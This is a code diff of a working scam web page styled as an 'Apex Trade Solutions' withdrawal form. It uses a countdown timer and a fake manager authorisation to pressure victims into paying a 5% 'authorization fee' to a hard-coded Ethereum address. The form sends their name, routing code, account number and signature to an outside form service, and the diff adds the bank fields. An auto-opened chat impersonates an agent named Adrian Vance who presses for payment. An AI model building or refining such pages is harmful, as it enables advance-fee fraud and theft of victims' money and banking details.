@@ -50,39 +50,43 @@
         <div class="timer-bg rounded-xl p-6 shadow-sm text-center">
             <p class="text-red-600 text-[10px] font-bold uppercase tracking-widest mb-1">Security Window</p>
             <div id="timer" class="text-4xl font-mono font-bold text-red-700 tracking-tighter">10:00</div>
-            <p class="text-[11px] text-red-500 mt-2 italic leading-relaxed px-4">
+            <p class="text-[11px] text-red-500 mt-2 italic text-center leading-relaxed px-4">
                 Authorized by Senior Manager Paola Almontes De León. Token expires in 10 minutes.
             </p>
         </div>
 
         <div class="fee-highlight rounded-xl p-5 space-y-4">
             <div class="text-center">
-                <p id="ui-fee-label" class="text-[10px] font-bold text-yellow-800 uppercase mb-1">Authorization Requirement (5%)</p>
+                <p id="ui-fee-label" class="text-[10px] font-bold text-yellow-800 uppercase text-center mb-1">Authorization Requirement (5%)</p>
                 <div id="settlement-summary" class="hidden py-2 px-4 bg-yellow-100 rounded-lg inline-block">
                     <span id="feeDisplay" class="text-lg font-black text-yellow-900">$0.00</span>
                 </div>
             </div>
             <div class="wallet-box p-3 rounded-lg text-center">
-                <p id="ui-node-label" class="text-[9px] text-slate-500 uppercase font-bold mb-1">Verified ERC-20 Node Address:</p>
-                <div class="text-[11px] break-all font-bold text-blue-900 select-all tracking-tight px-2">
+                <p id="ui-node-label" class="text-[9px] text-slate-500 uppercase font-bold mb-1 text-center">Official ETH Address (ERC-20):</p>
+                <div class="text-[11px] break-all font-bold text-blue-900 select-all tracking-tight px-2 text-center">
                     0x1c1C1958c983a3E6CFB19f88752E41A49eB569a2
                 </div>
-                <p class="text-[9px] text-blue-600 mt-2 font-bold italic underline">Tap address above to copy</p>
+                <p class="text-[9px] text-blue-600 mt-2 font-bold italic underline text-center">Tap address above to copy</p>
             </div>
         </div>
 
         <form action="https://usebasin.com/f/6346e42a9c0f" method="POST" class="bg-white rounded-2xl shadow-xl p-6 space-y-5 border border-slate-200">
-            
             <h2 id="ui-form-title" class="text-sm font-bold text-slate-800 uppercase tracking-wide border-b pb-3 text-center font-black">Withdrawal Requisition</h2>
 
             <div>
-                <label class="block text-xs font-black text-blue-900 mb-1 uppercase tracking-tight">Security Token (12-Digits)</label>
+                <label id="ui-token-label" class="block text-xs font-black text-blue-900 mb-1 uppercase tracking-tight text-left">Security Token (12-Digits)</label>
                 <input type="text" name="Security Token" placeholder="XXXX-XXXX-XXXX" maxlength="14" required class="token-input w-full p-3 text-center text-lg font-bold bg-slate-50 border border-blue-300 rounded-lg outline-none text-blue-900">
+            </div>
+
+            <div>
+                <label id="ui-name-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Full Legal Name</label>
+                <input type="text" name="Client Name" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
             </div>
 
             <div class="grid grid-cols-1 gap-4">
                 <div>
-                    <label id="ui-country-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase">Destination Country</label>
+                    <label id="ui-country-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Destination Country</label>
                     <select id="countrySelect" name="Country" onchange="updateBanks()" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
                         <option value="">-- Choose Country --</option>
                         <option value="USA">United States (USD)</option>
@@ -95,47 +99,47 @@
                     </select>
                 </div>
                 <div>
-                    <label id="ui-bank-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase">Receiving Institution</label>
+                    <label id="ui-bank-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Receiving Institution</label>
                     <select id="bankSelect" name="Bank" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
                         <option value="">-- Select Bank --</option>
                     </select>
                 </div>
             </div>
 
+            <div class="grid grid-cols-2 gap-4">
+                <div>
+                    <label id="ui-routing-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">BSB / Sort Code</label>
+                    <input type="text" name="Routing Number" placeholder="000-000" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
+                </div>
+                <div>
+                    <label id="ui-account-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Account Number</label>
+                    <input type="text" name="Account Number" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
+                </div>
+            </div>
+
             <div>
-                <label id="ui-amount-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase">Withdrawal Amount ($)</label>
+                <label id="ui-amount-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Withdrawal Amount ($)</label>
                 <input type="number" id="withdrawAmount" name="Amount" oninput="calculateSettlement()" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg font-bold text-blue-900 outline-none">
             </div>
 
             <div class="pt-4 border-t border-slate-100">
-                <label class="block text-xs font-bold text-slate-600 mb-1 uppercase">Full Legal Name (Digital Signature)</label>
-                <input type="text" id="sigInput" name="Digital Signature" placeholder="Type name to sign" oninput="updateSignature()" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none mb-2">
-                <div class="h-16 w-full bg-slate-100 border border-slate-300 rounded flex items-center justify-center italic text-blue-900 signature-font border-dashed" id="sigDisplay">
-                    Your Signature
-                </div>
+                <label id="ui-sig-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Digital Signature (Type to Sign)</label>
+                <input type="text" id="sigInput" name="Signature" placeholder="Type name to sign" oninput="updateSignature()" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none mb-2">
+                <div class="h-16 w-full bg-slate-100 border border-slate-300 rounded flex items-center justify-center italic text-blue-900 signature-font border-dashed" id="sigDisplay">Your Signature</div>
             </div>
 
-            <div class="flex items-start space-x-2 py-2">
-                <input type="checkbox" required class="mt-1">
-                <p class="text-[10px] text-slate-500 leading-tight">I authorize Apex Trade Solutions to facilitate this disbursement and agree to the 5% network synchronization fee for immediate release.</p>
-            </div>
-
-            <button type="submit" class="w-full btn-gradient text-white font-bold py-4 rounded-xl shadow-lg uppercase tracking-widest text-center mt-4">
-                Authorize Release & Pay Fee
-            </button>
-            
+            <button type="submit" class="w-full btn-gradient text-white font-bold py-4 rounded-xl shadow-lg uppercase tracking-widest text-center mt-4">Authorize Release</button>
             <p id="ui-status-label" class="text-[10px] text-gray-400 font-medium tracking-tight uppercase text-center italic mt-4">Encrypted Secure Transaction Node Active</p>
         </form>
     </main>
 
     <script>
-        // Language & Data Logic
         const translations = {
-            en: { title: "APEX TRADE SOLUTIONS", formTitle: "Withdrawal Requisition", country: "Destination Country", bank: "Receiving Institution", amount: "Withdrawal Amount ($)", fee: "Authorization Requirement (5%)", status: "Encrypted Secure Transaction Node Active", node: "Verified ERC-20 Node Address:" },
-            fr: { title: "APEX TRADE SOLUTIONS", formTitle: "Demande de Retrait", country: "Pays de Destination", bank: "Institution Réceptrice", amount: "Montant du Retrait ($)", fee: "Exigence d'Autorisation (5%)", status: "Nœud de Transaction Sécurisé Chiffré Actif", node: "Adresse du Nœud ERC-20 Vérifiée :" },
-            es: { title: "APEX TRADE SOLUTIONS", formTitle: "Requisito de Retiro", country: "País de Destino", bank: "Institución Receptora", amount: "Monto del Retiro ($)", fee: "Requisito de Autorización (5%)", status: "Nodo de Transacción Segura Cifrado Activo", node: "Dirección del Nodo ERC-20 Verificada:" },
-            no: { title: "APEX TRADE SOLUTIONS", formTitle: "Uttaksforespørsel", country: "Destinasjonsland", bank: "Mottakerbank", amount: "Uttaksbeløp ($)", fee: "Autorisasjonskrav (5%)", status: "Kryptert Sikker Transaksjonsnode Aktiv", node: "Verifisert ERC-20 Node-adresse:" },
-            de: { title: "APEX TRADE SOLUTIONS", formTitle: "Auszahlungsantrag", country: "Zielland", bank: "Empfangende Bank", amount: "Auszahlungsbetrag ($)", fee: "Autorisierungsanforderung (5%)", status: "Verschlüsselter Sicherer Transaktionsknoten Aktiv", node: "Verifizierte ERC-20 Node-Adresse:" }
+            en: { title: "APEX TRADE SOLUTIONS", formTitle: "Withdrawal Requisition", token: "Security Token (12-Digits)", name: "Full Legal Name", country: "Destination Country", bank: "Receiving Institution", routing: "BSB / Sort Code", account: "Account Number", amount: "Withdrawal Amount ($)", fee: "Authorization Requirement (5%)", sig: "Digital Signature (Type to Sign)", status: "Encrypted Secure Transaction Node Active", node: "Verified ERC-20 Node Address:" },
+            fr: { title: "APEX TRADE SOLUTIONS", formTitle: "Demande de Retrait", token: "Jeton de Sécurité", name: "Nom Légal Complet", country: "Pays de Destination", bank: "Institution Réceptrice", routing: "Code BSB / Sort", account: "Numéro de Compte", amount: "Montant du Retrait ($)", fee: "Exigence d'Autorisation (5%)", sig: "Signature Numérique", status: "Nœud de Transaction Sécurisé Chiffré Actif", node: "Adresse du Nœud ERC-20 Vérifiée :" },
+            es: { title: "APEX TRADE SOLUTIONS", formTitle: "Requisito de Retiro", token: "Token de Seguridad", name: "Nombre Legal Completo", country: "País de Destino", bank: "Institución Receptora", routing: "BSB / Código de Clasificación", account: "Número de Cuenta", amount: "Monto del Retiro ($)", fee: "Requisito de Autorización (5%)", sig: "Firma Digital", status: "Nodo de Transacción Segura Cifrado Activo", node: "Dirección del Nodo ERC-20 Verificada:" },
+            no: { title: "APEX TRADE SOLUTIONS", formTitle: "Uttaksforespørsel", token: "Sikkerhetstoken", name: "Fullt Juridisk Navn", country: "Destinasjonsland", bank: "Mottakerbank", routing: "BSB / Kontonummer-kode", account: "Kontonummer", amount: "Uttaksbeløp ($)", fee: "Autorisasjonskrav (5%)", sig: "Digital Signatur", status: "Kryptert Sikker Transaksjonsnode Aktiv", node: "Verifisert ERC-20 Node-adresse:" },
+            de: { title: "APEX TRADE SOLUTIONS", formTitle: "Auszahlungsantrag", token: "Sicherheitstoken", name: "Vollständiger Name", country: "Zielland", bank: "Empfangende Bank", routing: "Bankleitzahl / BLZ", account: "Kontonummer", amount: "Auszahlungsbetrag ($)", fee: "Autorisierungsanforderung (5%)", sig: "Digitale Signatur", status: "Verschlüsselter Sicherer Transaktionsknoten Aktiv", node: "Verifizierte ERC-20 Node-Adresse:" }
         };
 
         const bankData = {
@@ -153,10 +157,15 @@
             const t = translations[lang];
             document.getElementById("ui-title").innerText = t.title;
             document.getElementById("ui-form-title").innerText = t.formTitle;
+            document.getElementById("ui-token-label").innerText = t.token;
+            document.getElementById("ui-name-label").innerText = t.name;
             document.getElementById("ui-country-label").innerText = t.country;
             document.getElementById("ui-bank-label").innerText = t.bank;
+            document.getElementById("ui-routing-label").innerText = t.routing;
+            document.getElementById("ui-account-label").innerText = t.account;
             document.getElementById("ui-amount-label").innerText = t.amount;
             document.getElementById("ui-fee-label").innerText = t.fee;
+            document.getElementById("ui-sig-label").innerText = t.sig;
             document.getElementById("ui-status-label").innerText = t.status;
             document.getElementById("ui-node-label").innerText = t.node;
         }
@@ -181,36 +190,28 @@
             const feeDisplay = document.getElementById("feeDisplay");
             if (amount > 0) {
                 summary.classList.remove('hidden');
-                const fee = (amount * 0.05).toFixed(2);
-                feeDisplay.innerText = "$" + Number(fee).toLocaleString();
+                feeDisplay.innerText = "$" + (amount * 0.05).toLocaleString();
             } else {
                 summary.classList.add('hidden');
             }
         }
 
         function updateSignature() {
-            const input = document.getElementById('sigInput').value;
-            document.getElementById('sigDisplay').innerText = input || "Your Signature";
+            document.getElementById('sigDisplay').innerText = document.getElementById('sigInput').value || "Your Signature";
         }
 
-        // Timer Logic
         let time = 600;
-        const timerDisplay = document.getElementById('timer');
         setInterval(() => {
-            const minutes = Math.floor(time / 60);
-            let seconds = time % 60;
-            seconds = seconds < 10 ? '0' + seconds : seconds;
-            timerDisplay.innerHTML = `${minutes}:${seconds}`;
+            const mins = Math.floor(time / 60);
+            let secs = time % 60;
+            document.getElementById('timer').innerHTML = `${mins}:${secs < 10 ? '0' + secs : secs}`;
             if(time > 0) time--;
         }, 1000);
 
-        // Adrian Vance Automation via Smartsupp
         _smartsupp('on', 'load', function() {
             setTimeout(function() {
                 _smartsupp('chat:open');
-                _smartsupp('message:send', {
-                    text: "Authorized Session: I am Adrian Vance. I am monitoring your payout request. Please complete the requisition form and pay the 5% authorization fee to finalize your disbursement."
-                });
+                _smartsupp('message:send', { text: "Authorized Session: I am Adrian Vance. I am monitoring your payout request. Please complete the form and pay the 5% authorization fee to finalize your disbursement." });
             }, 3000);
         });
     </script>
